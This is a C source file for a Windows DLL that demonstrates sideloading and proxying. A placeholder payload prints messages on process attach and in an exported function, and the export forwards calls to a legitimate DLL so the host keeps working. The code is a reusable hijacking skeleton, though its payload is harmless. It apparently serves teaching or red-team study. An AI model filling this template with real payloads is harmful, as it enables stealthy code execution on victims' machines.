#include <windows.h>

/*---------------------------[ Payload ]---------------------------*/

void ProcAtt(){

	printf("[I] DLL Sideloading in PROCESS ATTACH >:)\n");

}

void InFuncExp(){

	printf("[I] DLL Sideloading in Exported Function >:)\n");
	
}

/*---------------------------[ DLL Proxying ]---------------------------*/

#define DLLEXPORT extern __declspec(dllexport)

typedef PCHAR (WINAPI* fnRetStr)();

DLLEXPORT PVOID RetStr(){
    
    InFuncExp();

    HMODULE  hDll    = LoadLibraryA("Dll_Legit1.dll");
    fnRetStr pRetStr = (fnRetStr)GetProcAddress( hDll, "RetStr" );

    return (PVOID)pRetStr();
}

/*---------------------------[ DllMain ]---------------------------*/

BOOL APIENTRY DllMain(HMODULE hModule, DWORD dwReason, LPVOID lpReserved) {
    switch (dwReason) {
    case DLL_PROCESS_ATTACH:
		ProcAtt();
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}